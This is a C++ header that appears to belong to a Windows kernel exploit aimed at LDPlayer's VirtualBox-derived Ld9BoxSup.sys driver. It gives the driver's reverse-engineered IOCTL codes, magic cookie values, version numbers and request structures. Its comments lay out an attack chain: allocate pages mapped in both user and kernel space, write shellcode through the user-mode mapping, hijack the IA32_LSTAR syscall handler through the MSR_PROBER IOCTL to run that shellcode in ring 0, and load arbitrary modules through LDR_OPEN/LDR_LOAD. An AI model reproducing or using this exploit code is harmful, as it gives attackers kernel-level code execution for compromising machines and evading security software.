/**
 * @file supdrv_types.h
 * @brief VirtualBox SUPDrv structure definitions for Ld9BoxSup.sys exploitation
 *
 * VERIFIED FROM BINARY ANALYSIS (Dec 2025):
 * All structure sizes and field offsets extracted directly from Ld9BoxSup.sys
 * disassembly at /docs/driver/Ld9BoxSup.sys (376,176 bytes, x86-64).
 *
 * Key findings from binary:
 * - Magic string: "The Magic Word!" (16 bytes at offset 0x36d58)
 * - IOCTL cookie code: 0x00228204 (at offset 0x3a80)
 * - SUP_IOCTL_COOKIE expects: cbIn=0x30 (48), cbOut=0x38 (56)
 * - SUPCOOKIE::Out has 4-byte padding before pSession for 8-byte alignment
 * - Driver compiled WITHOUT pack(1), uses natural alignment for pointers
 *
 * Reference: VirtualBox 6.1.36 source (LDPlayer fork)
 * https://www.virtualbox.org/svn/vbox/trunk/src/VBox/HostDrivers/Support/SUPDrvIOC.h
 */

#pragma once
#include <Windows.h>
#include <cstdint>

namespace supdrv {

//-----------------------------------------------------------------------------
// Constants extracted from Ld9BoxSup.sys binary analysis
//-----------------------------------------------------------------------------

// Magic string (16 chars including null terminator)
constexpr char SUPCOOKIE_MAGIC[] = "The Magic Word!";

// Initial cookie value - DISCOVERED FROM BINARY DISASSEMBLY (Dec 2025)
// At 0x140008f2d: cmp edx, 0x69726f74 - driver validates against "tori" not "Bori"
// LDPlayer modified this from VirtualBox's original 0x69726F42 ("Bori")
constexpr uint32_t SUPCOOKIE_INITIAL_COOKIE = 0x69726F74;  // "tori" in little-endian

// Header flags magic value
constexpr uint32_t SUPREQHDR_FLAGS_MAGIC = 0x42000042;
constexpr uint32_t SUPREQHDR_FLAGS_DEFAULT = SUPREQHDR_FLAGS_MAGIC;
constexpr uint32_t SUPREQHDR_FLAGS_EXTRA_IN = 0x00000001;

// IOCTL codes - VERIFIED from Ld9BoxSup.sys disassembly (Dec 2025)
// Formula: ((0x22) << 16) | ((0x02) << 14) | (((func) | 128) << 2) | (0)
//
// CRITICAL: LDPlayer shifted function numbers from standard VBox!
// They inserted QUERY_INFO at function 2, pushing LDR_OPEN to function 3.
// Previous code used function 6/7 which routed to wrong handlers.
//
// Dispatch table mapping (from binary analysis):
//   Function 1 (0x228204): COOKIE     - handshake (cbIn=0x30, cbOut=0x38)
//   Function 2 (0x228208): QUERY_INFO - LDPlayer added (cbIn=0x18, cbOut=0x40E0)
//   Function 3 (0x22820C): LDR_OPEN   - allocate kernel memory (cbIn=0x148, cbOut=0x28)
//   Function 4 (0x228210): LDR_LOAD   - load module (variable cbIn, cbOut=0x820)
constexpr DWORD SUP_IOCTL_COOKIE         = 0x00228204;  // Function 1
constexpr DWORD SUP_IOCTL_QUERY_INFO     = 0x00228208;  // Function 2 (LDPlayer added)
constexpr DWORD SUP_IOCTL_LDR_OPEN       = 0x0022820C;  // Function 3 (NOT 6!)
constexpr DWORD SUP_IOCTL_LDR_LOAD       = 0x00228210;  // Function 4 (NOT 7!)
constexpr DWORD SUP_IOCTL_LDR_FREE       = 0x00228214;  // Function 5
constexpr DWORD SUP_IOCTL_LDR_GET_SYMBOL = 0x00228218;  // Function 6
constexpr DWORD SUP_IOCTL_CALL_VMMR0     = 0x0022821C;  // Function 7
constexpr DWORD SUP_IOCTL_LOW_ALLOC      = 0x00228220;  // Function 8 - Low memory alloc (<4GB)
constexpr DWORD SUP_IOCTL_LOW_FREE       = 0x00228224;  // Function 9
constexpr DWORD SUP_IOCTL_PAGE_ALLOC_EX  = 0x00228228;  // Function 10 - KEY: dual R3/R0 mapping!
constexpr DWORD SUP_IOCTL_PAGE_MAP_KERNEL= 0x0022822C;  // Function 11
constexpr DWORD SUP_IOCTL_PAGE_PROTECT   = 0x00228230;  // Function 12
constexpr DWORD SUP_IOCTL_PAGE_FREE      = 0x00228234;  // Function 13
constexpr DWORD SUP_IOCTL_PAGE_LOCK      = 0x00228238;  // Function 14
constexpr DWORD SUP_IOCTL_PAGE_UNLOCK    = 0x0022823C;  // Function 15
constexpr DWORD SUP_IOCTL_CONT_ALLOC     = 0x00228240;  // Function 16
constexpr DWORD SUP_IOCTL_CONT_FREE      = 0x00228244;  // Function 17
constexpr DWORD SUP_IOCTL_MSR_PROBER     = 0x00228288;  // Function 34 - KEY: MSR read/write!

// VirtualBox error codes
constexpr int32_t VINF_SUCCESS = 0;
constexpr int32_t VERR_INTERNAL_ERROR = -225;
constexpr int32_t VERR_INVALID_PARAMETER = -87;
constexpr int32_t VERR_ALREADY_LOADED = -104;
constexpr int32_t VERR_VM_DRIVER_VERSION_MISMATCH = -3456;
constexpr int32_t VERR_LDR_GENERAL_FAILURE = -618;

// Known driver versions for version probing
// CRITICAL: Version 0x320000 discovered from Ld9BoxSup.sys binary disassembly (Dec 2025)
// At offset 0x140004787: cmp r8d, 0x320000 - driver validates against this version
// At offset 0x1400047ac: mov dword ptr [rbx + 0x20], 0x320000 - driver returns this version
//
// VirtualBox versions map predictably:
//   LDPlayer 9.x   -> 0x00320000 (VBox 7.x fork) - VERIFIED FROM BINARY
//   6.1.36-6.1.50  -> 0x00290008
//   6.1.0-6.1.35   -> 0x00290006, 0x00290007
//   6.0.x          -> 0x001F0007
//   5.2.x          -> 0x001C0007
constexpr uint32_t KNOWN_VERSIONS[] = {
    0x00320000,  // LDPlayer 9.x Ld9BoxSup.sys - DISCOVERED FROM BINARY DISASSEMBLY
    0x00290008,  // 6.1.36+ (most likely for LDPlayer)
    0x00290007,  // 6.1.x early
    0x00290006,  // 6.1.x
    0x001F0007,  // 6.0.x
    0x001C0007,  // 5.2.x
};
constexpr size_t KNOWN_VERSIONS_COUNT = sizeof(KNOWN_VERSIONS) / sizeof(KNOWN_VERSIONS[0]);

//-----------------------------------------------------------------------------
// Structure definitions
//-----------------------------------------------------------------------------

#pragma pack(push, 1)

/**
 * Common request header for all SUPDrv IOCTLs
 */
typedef struct SUPREQHDR {
    uint32_t u32Cookie;         // Cookie from initial handshake
    uint32_t u32SessionCookie;  // Session-specific cookie
    uint32_t cbIn;              // Size of input data
    uint32_t cbOut;             // Size of output data
    uint32_t fFlags;            // Flags (must include SUPREQHDR_FLAGS_MAGIC)
    int32_t  rc;                // VirtualBox status code (VINF_SUCCESS on success)
} SUPREQHDR, *PSUPREQHDR;

/**
 * SUP_IOCTL_COOKIE - Establish session and negotiate version
 *
 * CRITICAL: Field order MUST match VBox exactly!
 * Reference: VirtualBox/trunk/src/VBox/HostDrivers/Support/SUPDrvIOC.h
 */
typedef struct SUPCOOKIE {
    SUPREQHDR Hdr;
    union {
        struct {
            char     szMagic[16];     // MUST be first - "The Magic Word!"
            uint32_t u32ReqVersion;   // Version we request
            uint32_t u32MinVersion;   // Minimum version we accept
        } In;
        struct {
            uint32_t u32Cookie;          // Returned cookie for subsequent calls
            uint32_t u32SessionCookie;   // Session cookie
            uint32_t u32SessionVersion;  // Driver version
            uint32_t u32DriverVersion;   // Driver revision
            uint32_t cFunctions;         // Number of exported functions
            uint32_t u32Padding;         // ALIGNMENT PADDING - driver expects 8-byte aligned pSession
                                         // Binary analysis: cbOut = 0x38 (56), Out must be 32 bytes
            uint64_t pSession;           // Session pointer (kernel address) - 8 bytes on x64
        } Out;  // Total: 4+4+4+4+4+4+8 = 32 bytes (verified from binary)
    } u;
} SUPCOOKIE, *PSUPCOOKIE;

// Size calculations for SUPCOOKIE - VERIFIED from binary analysis
constexpr size_t SUP_IOCTL_COOKIE_SIZE_IN = sizeof(SUPREQHDR) + sizeof(SUPCOOKIE::u.In);
constexpr size_t SUP_IOCTL_COOKIE_SIZE_OUT = sizeof(SUPREQHDR) + sizeof(SUPCOOKIE::u.Out);

// COMPILE-TIME VERIFICATION against binary-extracted values
static_assert(sizeof(SUPREQHDR) == 24, "SUPREQHDR must be 24 bytes");
static_assert(sizeof(SUPCOOKIE::u.In) == 24, "SUPCOOKIE::In must be 24 bytes (16+4+4)");
static_assert(sizeof(SUPCOOKIE::u.Out) == 32, "SUPCOOKIE::Out must be 32 bytes (4+4+4+4+4+4+8)");
static_assert(SUP_IOCTL_COOKIE_SIZE_IN == 0x30, "cbIn must be 0x30 (48) per binary");
static_assert(SUP_IOCTL_COOKIE_SIZE_OUT == 0x38, "cbOut must be 0x38 (56) per binary");

/**
 * SUP_IOCTL_LDR_OPEN - Request kernel memory allocation for module
 *
 * CRITICAL: Sizes extracted from Ld9BoxSup.sys binary disassembly (Dec 2025):
 * At 0x14000746e: cmp $0x148, %edx  -> cbIn must be 0x148 (328)
 * At 0x14000747a: cmp $0x28, 0xc    -> cbOut must be 0x28 (40)
 *
 * The driver was compiled WITHOUT pack(1), so natural alignment applies:
 * - Out struct has 4 bytes padding after fNativeLoader (8+4+4=16)
 * - SUPLDROPEN has 4 bytes end padding to make it 8-byte aligned (24+300+4=328)
 */
typedef struct SUPLDROPEN {
    SUPREQHDR Hdr;
    union {
        struct {
            uint32_t cbImageWithTabs;  // Total image size (with symbol/string tables)
            uint32_t cbImageBits;      // Image bits size (code + data only)
            char     szName[32];       // Module name (arbitrary)
            char     szFilename[260];  // Filename (ignored, can be fake)
        } In;
        struct {
            void*    pvImageBase;      // RETURNED: Kernel address for our code
            int32_t  fNativeLoader;    // True if native OS loader used
            uint32_t u32Padding;       // ALIGNMENT PADDING - driver expects 16-byte Out
        } Out;
    } u;
    uint32_t u32EndPadding;            // ALIGNMENT PADDING - driver expects 328-byte struct
} SUPLDROPEN, *PSUPLDROPEN;

// Size constants - VERIFIED from binary disassembly
// NOTE: These are hardcoded to match the driver, NOT calculated from our struct
constexpr size_t SUP_IOCTL_LDR_OPEN_SIZE_IN = 0x148;   // 328 bytes (from binary)
constexpr size_t SUP_IOCTL_LDR_OPEN_SIZE_OUT = 0x28;   // 40 bytes (from binary)

// Verify SUPLDROPEN sizes at compile time - now with padding
static_assert(sizeof(SUPLDROPEN::u.In) == 300, "SUPLDROPEN::In must be 300 bytes (4+4+32+260)");
static_assert(sizeof(SUPLDROPEN::u.Out) == 16, "SUPLDROPEN::Out must be 16 bytes (8+4+4 padding)");
static_assert(sizeof(SUPLDROPEN) == 328, "SUPLDROPEN must be 328 bytes (verified from binary)");
static_assert(SUP_IOCTL_LDR_OPEN_SIZE_IN == 328, "LDR_OPEN cbIn must be 328 per binary");
static_assert(SUP_IOCTL_LDR_OPEN_SIZE_OUT == 40, "LDR_OPEN cbOut must be 40 per binary");

/**
 * Entry point type enumeration
 */
typedef enum SUPLDRLOADEP {
    SUPLDRLOADEP_NOTHING = 0,  // No entry point
    SUPLDRLOADEP_VMMR0,        // VMM Ring-0 entry
    SUPLDRLOADEP_SERVICE       // Service entry point
} SUPLDRLOADEP;

/**
 * SUP_IOCTL_LDR_LOAD - Load module and optionally execute entry point
 *
 * This is a variable-size structure. The actual size depends on the
 * image being loaded. Use SUP_IOCTL_LDR_LOAD_SIZE_IN(cbImage) macro.
 */
typedef struct SUPLDRLOAD {
    SUPREQHDR Hdr;
    union {
        struct {
            void*        pvImageBase;      // Must match SUP_IOCTL_LDR_OPEN result
            uint32_t     cbImageWithTabs;  // Same as SUPLDROPEN
            uint32_t     cbImageBits;      // Same as SUPLDROPEN

            // Symbol table info (set to 0 for raw code)
            uint32_t     offSymbols;       // Offset to symbol table (0 if none)
            uint32_t     cSymbols;         // Symbol count (0 if none)
            uint32_t     offStrTab;        // Offset to string table (0 if none)
            uint32_t     cbStrTab;         // String table size (0 if none)

            // Entry point configuration
            SUPLDRLOADEP eEPType;          // Entry point type

            // CRITICAL: These are called by the driver!
            void*        pfnModuleInit;    // Called after load -> SET TO pvImageBase!
            void*        pfnModuleTerm;    // Called on unload (can be NULL)

            // VMM-specific (only if eEPType == SUPLDRLOADEP_VMMR0)
            void*        pvVMMR0;          // VM handle
            void*        pvVMMR0EntryFast; // Fast entry point
            void*        pvVMMR0EntryEx;   // Extended entry point

            // Image data follows header (variable length)
            uint8_t      abImage[1];
        } In;
        struct {
            int32_t      rc;               // Return code
        } Out;
    } u;
} SUPLDRLOAD, *PSUPLDRLOAD;

// Size calculation for SUPLDRLOAD
// Note: abImage[1] is just a placeholder, actual size is cbImage
constexpr size_t SUPLDRLOAD_BASE_SIZE = offsetof(SUPLDRLOAD, u.In.abImage);
#define SUP_IOCTL_LDR_LOAD_SIZE_IN(cbImage) (SUPLDRLOAD_BASE_SIZE + (cbImage))
constexpr size_t SUP_IOCTL_LDR_LOAD_SIZE_OUT = sizeof(SUPREQHDR) + sizeof(int32_t);

//-----------------------------------------------------------------------------
// PAGE_ALLOC_EX - Allocate pages with dual R3/R0 mappings
// This is KEY for the self-patching attack: we write shellcode via R3,
// then execute it via R0 (same physical pages, different virtual addresses)
//-----------------------------------------------------------------------------

/**
 * SUP_IOCTL_PAGE_ALLOC_EX - Allocate memory with R3 and/or R0 mappings
 *
 * This IOCTL is central to our self-patching strategy:
 * 1. Allocate pages with both fKernelMapping=true and fUserMapping=true
 * 2. Driver returns pvR3 (usermode writable) and pvR0 (kernel executable)
 * 3. Write shellcode to pvR3 from usermode
 * 4. Trigger execution at pvR0 via IA32_LSTAR hijack
 *
 * Structure derived from VirtualBox SUPDrvIOC.h
 */
typedef struct SUPPAGEALLOCEX {
    SUPREQHDR Hdr;
    union {
        struct {
            uint32_t cPages;           // Number of 4KB pages to allocate
            uint8_t  fKernelMapping;   // If true, map into kernel space (pvR0)
            uint8_t  fUserMapping;     // If true, map into user space (pvR3) - REQUIRED
            uint8_t  fReserved0;       // Must be 0
            uint8_t  fReserved1;       // Must be 0
        } In;
        struct {
            uint64_t pvR3;             // Ring-3 mapping address (usermode writable)
            uint64_t pvR0;             // Ring-0 mapping address (kernel executable)
            // Physical page addresses follow (cPages * sizeof(uint64_t))
            // We use a flexible array approach for aPages
        } Out;
    } u;
} SUPPAGEALLOCEX, *PSUPPAGEALLOCEX;

// PAGE_ALLOC_EX sizes - base structure without physical page array
constexpr size_t SUP_IOCTL_PAGE_ALLOC_EX_SIZE_IN = sizeof(SUPREQHDR) + 8;  // Header + In (4+1+1+1+1)
// Output size depends on cPages: SUPREQHDR + pvR3 + pvR0 + (cPages * 8)
#define SUP_IOCTL_PAGE_ALLOC_EX_SIZE_OUT(cPages) (sizeof(SUPREQHDR) + 16 + ((cPages) * 8))

// Verify PAGE_ALLOC_EX base sizes
static_assert(sizeof(SUPPAGEALLOCEX::u.In) == 8, "SUPPAGEALLOCEX::In must be 8 bytes");

//-----------------------------------------------------------------------------
// MSR_PROBER - Read/write Model Specific Registers
// KEY for hijacking IA32_LSTAR (syscall handler) to redirect to our shellcode
//-----------------------------------------------------------------------------

/**
 * MSR prober operation types
 */
typedef enum SUPMSRPROBEROP {
    SUPMSRPROBEROP_INVALID = 0,
    SUPMSRPROBEROP_READ,           // Read MSR value
    SUPMSRPROBEROP_WRITE,          // Write MSR value
    SUPMSRPROBEROP_MODIFY,         // Read-modify-write (AND mask then OR mask)
    SUPMSRPROBEROP_MODIFY_FASTER,  // Faster modify without saving original
    SUPMSRPROBEROP_END,
    SUPMSRPROBEROP_32BIT_HACK = 0x7FFFFFFF
} SUPMSRPROBEROP;

/**
 * SUP_IOCTL_MSR_PROBER - Read/write CPU Model Specific Registers
 *
 * This IOCTL allows us to:
 * 1. Read IA32_LSTAR (MSR 0xC0000082) - save original syscall handler
 * 2. Write IA32_LSTAR to point to our shellcode (pvR0 from PAGE_ALLOC_EX)
 * 3. Trigger syscall -> our shellcode executes in Ring 0!
 * 4. Restore IA32_LSTAR to original value
 *
 * Structure derived from VirtualBox SUPDrvIOC.h
 */
typedef struct SUPMSRPROBER {
    SUPREQHDR Hdr;
    union {
        struct {
            SUPMSRPROBEROP enmOp;     // Operation type
            uint32_t       uMsr;      // MSR number (e.g., 0xC0000082 for IA32_LSTAR)
            uint32_t       idCpu;     // Target CPU (UINT32_MAX = any CPU)
            uint32_t       u32Padding;
            union {
                // For SUPMSRPROBEROP_READ: no additional input
                struct {
                    uint64_t uToWrite;   // Value to write
                } Write;
                struct {
                    uint64_t fAndMask;   // AND mask for modify
                    uint64_t fOrMask;    // OR mask for modify
                } Modify;
                uint64_t auPadding[3];   // Ensure consistent size
            } uArgs;
        } In;
        struct {
            union {
                struct {
                    uint64_t uValue;     // Read value
                    uint8_t  fGp;        // True if #GP during read
                    uint8_t  abPadding[7];
                } Read;
                struct {
                    uint8_t  fGp;        // True if #GP during write
                    uint8_t  abPadding[15];
                } Write;
                uint64_t auPadding[5];   // Ensure consistent size
            } uResults;
        } Out;
    } u;
} SUPMSRPROBER, *PSUPMSRPROBER;

// Key MSR numbers
constexpr uint32_t MSR_IA32_LSTAR = 0xC0000082;  // Syscall handler address (64-bit)
constexpr uint32_t MSR_IA32_STAR  = 0xC0000081;  // Syscall segment selectors
constexpr uint32_t MSR_IA32_FMASK = 0xC0000084;  // Syscall RFLAGS mask

// MSR_PROBER sizes
constexpr size_t SUP_IOCTL_MSR_PROBER_SIZE_IN = sizeof(SUPREQHDR) + sizeof(SUPMSRPROBER::u.In);
constexpr size_t SUP_IOCTL_MSR_PROBER_SIZE_OUT = sizeof(SUPREQHDR) + sizeof(SUPMSRPROBER::u.Out);

//-----------------------------------------------------------------------------
// PAGE_FREE - Free pages allocated by PAGE_ALLOC_EX
//-----------------------------------------------------------------------------

typedef struct SUPPAGEFREE {
    SUPREQHDR Hdr;
    union {
        struct {
            uint64_t pvR3;  // R3 address returned by PAGE_ALLOC_EX
        } In;
    } u;
} SUPPAGEFREE, *PSUPPAGEFREE;

constexpr size_t SUP_IOCTL_PAGE_FREE_SIZE_IN = sizeof(SUPREQHDR) + 8;
constexpr size_t SUP_IOCTL_PAGE_FREE_SIZE_OUT = sizeof(SUPREQHDR);

#pragma pack(pop)

//-----------------------------------------------------------------------------
// Helper macros
//-----------------------------------------------------------------------------

// Check if kernel address is valid (in kernel space)
inline bool IsKernelAddress(void* addr) {
    return reinterpret_cast<uint64_t>(addr) >= 0xFFFF800000000000ULL;
}

// Device names - extracted from actual Ld9BoxSup.sys binary analysis
// The driver creates \Device\Ld9BoxDrv and \Device\Ld9BoxDrvU (user-mode variant)
// NOTE: VirtualBox/LDPlayer drivers do NOT create DosDevices symbolic links!
// Must use NtCreateFile with NT device paths, not CreateFileW with \\.\

// NT device paths (for use with NtCreateFile) - THESE ACTUALLY WORK
constexpr wchar_t NT_DEVICE_NAME_LDPLAYER[] = L"\\Device\\Ld9BoxDrv";
constexpr wchar_t NT_DEVICE_NAME_LDPLAYER_USER[] = L"\\Device\\Ld9BoxDrvU";
constexpr wchar_t NT_DEVICE_NAME_VBOX[] = L"\\Device\\VBoxDrv";

// DosDevices paths (for CreateFileW) - THESE DON'T WORK (no symlink created)
// Kept for backwards compatibility but OpenDevice should use NT paths
constexpr wchar_t DEVICE_NAME_LDPLAYER[] = L"\\\\.\\Ld9BoxDrv";
constexpr wchar_t DEVICE_NAME_LDPLAYER_USER[] = L"\\\\.\\Ld9BoxDrvU";
constexpr wchar_t DEVICE_NAME_VBOX[] = L"\\\\.\\VBoxDrv";  // Kept for legacy VirtualBox compatibility

} // namespace supdrv
